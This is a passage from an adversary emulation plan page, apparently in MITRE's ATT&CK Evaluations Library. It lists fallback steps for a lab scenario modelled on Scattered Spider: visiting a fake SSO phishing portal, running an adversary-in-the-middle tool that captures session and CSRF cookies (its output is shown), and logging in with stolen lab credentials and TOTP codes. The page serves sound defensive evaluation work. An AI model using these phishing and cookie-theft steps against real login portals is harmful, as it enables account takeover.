@@ -1,0 +1,2935 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-ST8G6EL3M2"></script>
+    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-ST8G6EL3M2');</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.818693826522">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.11.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Scattered Spider Scenario Alternative Steps</title>
+    <meta name="title" content="Scattered Spider Scenario Alternative Steps">
+    <meta name="description" content="Alternative steps are designed to allow continued execution in the event of unexpected errors in the environment or scenario.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/scattered_spider/emulation_plan/scattered_spider_alternative_steps/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/scattered_spider/emulation_plan/scattered_spider_alternative_steps/">
+    <meta property="og:title" content="Scattered Spider Scenario Alternative Steps">
+    <meta property="og:description" content="Alternative steps are designed to allow continued execution in the event of unexpected errors in the environment or scenario.">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/scattered_spider/emulation_plan/scattered_spider_alternative_steps/">
+    <meta property="twitter:title" content="Scattered Spider Scenario Alternative Steps">
+    <meta property="twitter:description" content="Alternative steps are designed to allow continued execution in the event of unexpected errors in the environment or scenario.">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../favicon.png" rel="icon">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.818693826522" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.818693826522" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.818693826522" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.818693826522" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+    
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav id="retype-header-nav" class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="retype-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+    
+        <div id="retype-container" class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 bg-body-bg">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="retype-markdown" id="retype-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <nav id="retype-breadcrumb" class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Enterprise
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/scattered_spider/" class="pr-4">
+                                                Scattered Spider
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/scattered_spider/emulation_plan/" class="pr-4">
+                                                Scattered Spider Emulation Plans
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/scattered_spider/emulation_plan/scattered_spider_alternative_steps/" class="pr-4">
+                                                Scattered Spider Scenario Alternative Steps
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="scattered-spider-scenario-alternative-steps" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#scattered-spider-scenario-alternative-steps">#</doc-anchor-trigger>
+        <span>Scattered Spider Scenario Alternative Steps</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="using-alternative-steps">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#using-alternative-steps">#</doc-anchor-trigger>
+        <span>Using Alternative Steps</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Alternative steps are designed to allow continued execution in the event of
+unexpected errors in the environment or scenario.</p>
+<doc-anchor-target id="step-1---user-fails-to-receive-phishing-email">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---user-fails-to-receive-phishing-email">#</doc-anchor-trigger>
+        <span>Step 1 - User Fails to Receive Phishing Email</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-1">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If the user fails to receive the phishing email in Outlook, perform the
+following alternative step to visit the fake SSO login portal in the browser.</p>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Within your RDP session to the unmanaged workstation <code v-pre>casterlyrock (12.78.44.201)</code>, open FireFox and browse to the following URL for the fake SSO
+portal: <code v-pre>http://sso-kingslanding.net/</code>.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reconnaissance</td>
+<td>T1598.003</td>
+<td>Phishing for Information: Spearphishing Link</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>User manually visits phishing site from original phishing email</td>
+<td>casterlyrock (12.78.44.201)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.cyberresilience.com/threatonomics/resilience-threat-researchers-identify-new-campaigns-from-scattered-spider/" class="outbound" target="_blank"><span>9</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-1---phishing-server-fails-to-obtain-session-and-csrf-cookies">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---phishing-server-fails-to-obtain-session-and-csrf-cookies">#</doc-anchor-trigger>
+        <span>Step 1 - Phishing Server Fails to Obtain Session and CSRF Cookies</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-2">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-2">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If the phishing server fails to obtain the session and CSRF cookies from the
+legitimate Authentik server for reasons other than invalid credentials, perform
+the following alternative step to obtain the cookies.</p>
+<doc-anchor-target id="procedures-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-1">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>Within your RDP session to your Kali attack host <code v-pre>driftmark (174.3.0.70)</code>,
+execute the TOTP CLI utility in a terminal window to generate a new token,
+entering the following password when prompted.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Decode-Acclimate</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">totp-cli generate kingslanding kingslanding-tlannister</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Password: ***
+######</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Copy the OTP and execute the following command in the Kali terminal window
+(make sure to replace <code v-pre>REPLACE_WITH_OTP_VALUE</code> with the actual OTP value).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">cd /opt/kalidev/scattered_spider/Resources/payloads
+sudo ./aitm_alternative -targetUrl https://sso.kingslanding.net/ -user tlannister -password 'Engine-Dropkick' -token REPLACE_WITH_OTP_VALUE</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">[SUCCESS] 2024/10/30 21:15:48 Successful login for user tlannister
+   [INFO] 2025/07/14 22:35:47 Obtained CSRF token for user tlannister: GjIkKeubeQuAJtiB6gaM18PF2Riq62xk
+   [INFO] 2025/07/14 22:35:47 Obtained final session cookie for user tlannister: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJ2Y3p2ajB3NnJrbWttZGl3aGM0d3F3dTM3czJ6aGF3ZiIsImlzcyI6ImF1dGhlbnRpayIsInN1YiI6IjEwZjM4ODMzZDY5Y2UwODE1ZTg0YTdhMDNjZWMwMjUwMzRkMzUxMGVkMzUwNjRmZTIwYmVkZmUwOWUzZDBmNzQiLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJhY3IiOiJnb2F1dGhlbnRpay5pby9jb3JlL2RlZmF1bHQifQ.ExhChE6Eo1axnFdA-4YWKZlaA84GIz6ZVzMhRGuUxW4
+[SUCCESS] 2025/07/14 22:35:47 Use the following cookie names and values to bypass login in a browser window:
+authentik_session: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJ2Y3p2ajB3NnJrbWttZGl3aGM0d3F3dTM3czJ6aGF3ZiIsImlzcyI6ImF1dGhlbnRpayIsInN1YiI6IjEwZjM4ODMzZDY5Y2UwODE1ZTg0YTdhMDNjZWMwMjUwMzRkMzUxMGVkMzUwNjRmZTIwYmVkZmUwOWUzZDBmNzQiLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJhY3IiOiJnb2F1dGhlbnRpay5pby9jb3JlL2RlZmF1bHQifQ.ExhChE6Eo1axnFdA-4YWKZlaA84GIz6ZVzMhRGuUxW4
+authentik_csrf: GjIkKeubeQuAJtiB6gaM18PF2Riq62xk
+[SUCCESS] 2025/07/14 22:35:47 Successfully obtained session cookie!</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Ensure the alternative executable returns a success message with the session
+cookie and CSRF token cookie values. Return to the main scenario.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-1">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Credential Access</td>
+<td>T1557</td>
+<td>Adversary-in-the-Middle</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses collected victim user credentials to generate a valid session and CSRF cookies for the SSO portal</td>
+<td>citywatch (10.55.3.102)</td>
+<td>tlannister</td>
+<td><a href="https://github.com/attackevals/scattered_spider/tree/main/Resources/AITM" class="outbound" target="_blank"><span>AITM</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+<td><a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trellix.com/blogs/research/scattered-spider-the-modus-operandi/" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-1---session-cookie-authentication-to-sso-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---session-cookie-authentication-to-sso-fails">#</doc-anchor-trigger>
+        <span>Step 1 - Session Cookie Authentication to SSO Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-3">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-3">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If authentication to the legitimate SSO portal fails with the session and CSRF
+cookies from the phishing framework, perform the following alternative step to
+log into the portal.</p>
+<doc-anchor-target id="procedures-2">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-2">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Within your FireFox browser on the Kali attack host <code v-pre>driftmark (174.3.0.70)</code>,
+browse to the real SSO portal at <code v-pre>https://sso.kingslanding.net/</code> and log in with
+the following credentials.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code v-pre>https://sso.kingslanding.net/</code></td>
+<td>tlannister</td>
+<td>Engine-Dropkick</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p>When prompted for the MFA token, execute the TOTP CLI utility in a Kali terminal
+window, entering the following password when prompted.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Decode-Acclimate</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">totp-cli generate kingslanding kingslanding-tlannister</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Password: ***
+######</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Copy the OTP and use it to finish logging into the SSO portal.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-2">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-2">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
